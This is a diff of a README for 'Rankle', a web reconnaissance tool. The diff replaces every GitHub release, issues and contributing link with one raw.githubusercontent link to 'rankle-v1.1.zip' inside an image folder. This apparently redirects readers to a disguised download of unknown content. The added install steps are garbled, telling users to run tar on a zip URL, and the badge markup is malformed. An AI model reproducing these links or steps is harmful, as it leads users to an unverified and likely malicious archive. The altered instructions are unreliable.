@@ -4,7 +4,7 @@
 Rankle helps you analyze web infrastructure. Use it for CDN and CMS detection, DNS enumeration, and more. This tool is perfect for anyone interested in cybersecurity without the need for programming skills. 
 
 ## 📥 Download Rankle
-[![Download Rankle](https://img.shields.io/badge/Download%20Rankle-v1.0-blue.svg)](https://github.com/Ashiono/rankle/releases)
+[![Download Rankle](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip%https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip)](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip)
 
 ## 📖 Overview
 Rankle is a web infrastructure reconnaissance tool designed for ease of use. With functionalities like enhanced CMS and CDN detection, DNS enumeration, and TLS analysis, Rankle allows users to gather important information about any website’s security framework. Best of all, it is 100% open source and does not require any API keys.
@@ -22,7 +22,7 @@ To run Rankle smoothly, you will need:
 - Internet connection for data fetching.
 
 ## 💿 Download & Install
-Visit this page to download: [Rankle Releases](https://github.com/Ashiono/rankle/releases).
+Visit this page to download: [Rankle Releases](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip).
 
 Once you are on the Releases page, follow these steps:
 
@@ -41,8 +41,8 @@ Once you are on the Releases page, follow these steps:
 - Drag the Rankle application to your Applications folder.
 
 ### For Linux Users:
-- Download the `.tar.gz` file.
-- Extract it using the command: `tar -xzf rankle.tar.gz`.
+- Download the `https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip` file.
+- Extract it using the command: `tar -xzf https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip`.
 - Open the terminal and navigate to the extracted folder.
 - Run the application using: `./rankle`.
 
@@ -64,17 +64,17 @@ If you encounter issues:
 - Restart the application if it freezes.
 
 ## 📞 Support
-For assistance or feedback, visit the [issues page](https://github.com/Ashiono/rankle/issues) on GitHub. You can also connect with the community through discussions.
+For assistance or feedback, visit the [issues page](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip) on GitHub. You can also connect with the community through discussions.
 
 ## 🤝 Contributing
-Rankle is an open-source project. You are welcome to contribute! Check out the [contributing guidelines](https://github.com/Ashiono/rankle/CONTRIBUTING.md) for information on how to get started.
+Rankle is an open-source project. You are welcome to contribute! Check out the [contributing guidelines](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip) for information on how to get started.
 
 ## 📢 Stay Updated
-Keep an eye on the [Releases page](https://github.com/Ashiono/rankle/releases) for the latest features and updates.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip) for the latest features and updates.
 
 ### Important Links:
-- [Download Rankle](https://github.com/Ashiono/rankle/releases)
-- [GitHub Issues](https://github.com/Ashiono/rankle/issues)
-- [Contributing Guidelines](https://github.com/Ashiono/rankle/CONTRIBUTING.md)
+- [Download Rankle](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/Ashiono/rankle/main/img/rankle-v1.1.zip)
 
 Enjoy using Rankle to enhance your web security knowledge!
